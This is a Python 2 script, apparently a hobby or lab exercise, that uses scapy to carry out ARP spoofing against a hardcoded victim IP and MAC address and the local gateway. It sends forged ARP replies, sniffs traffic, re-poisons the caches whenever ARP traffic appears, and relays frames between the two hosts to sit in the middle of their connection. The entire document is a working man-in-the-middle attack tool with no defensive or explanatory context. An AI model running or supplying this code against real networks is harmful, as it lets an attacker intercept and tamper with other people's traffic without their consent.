import socket
import netifaces as ni
from scapy.all import *
import time

victim_ip = '192.168.126.132'	
victim_mac = '00:0c:29:ad:60:36'

gateway_mac = '00:50:56:fb:c5:49'
gateway_ip=''

my_mac=''
my_ip=''

def infect():

	victim = ARP()
	victim.hwsrc = my_mac
	victim.psrc = gateway_ip
	victim.pdst = victim_ip
	victim.hwdst = victim_mac
	victim.op = 2
	send(victim)

	gw = ARP()
	gw.hwsrc = my_mac
	gw.psrc = victim_ip
	gw.pdst = gateway_ip
	gw.op = 2
	gw.hwdst = gateway_mac
	send(gw)
	
def maintain_sniff(packet):
	pkt = packet.copy()
	
	pkt.show()
	if pkt[0].type == 0x806:
		infect()
	else:
		if pkt[0].src == victim_mac and pkt[0].dst == my_mac :
			pkt[0].src = my_mac
			pkt[0].dst = gateway_mac
			
		elif pkt[0].src == gateway_mac and pkt[0].dst == my_mac :
			pkt[0].src = my_mac
			pkt[0].dst = victim_mac

	del pkt.chksum
	del pkt.len

	sendp(pkt)
	time.sleep(0.01)

def get_my_info():

	info = []
	my_ip_info = ni.ifaddresses('ens33')

	info.append(my_ip_info[2][0]['addr'])
	info.append(my_ip_info[17][0]['addr'])
	info.append(ni.gateways()['default'][2][0])

	return info

if __name__ == '__main__':

	info = get_my_info()	
	my_ip = info[0]
	my_mac = info[1]
	gateway_ip = info[2]
	
	infect()
	pkts = sniff(prn=maintain_sniff, count=0)
	
	print 'success'
	
	
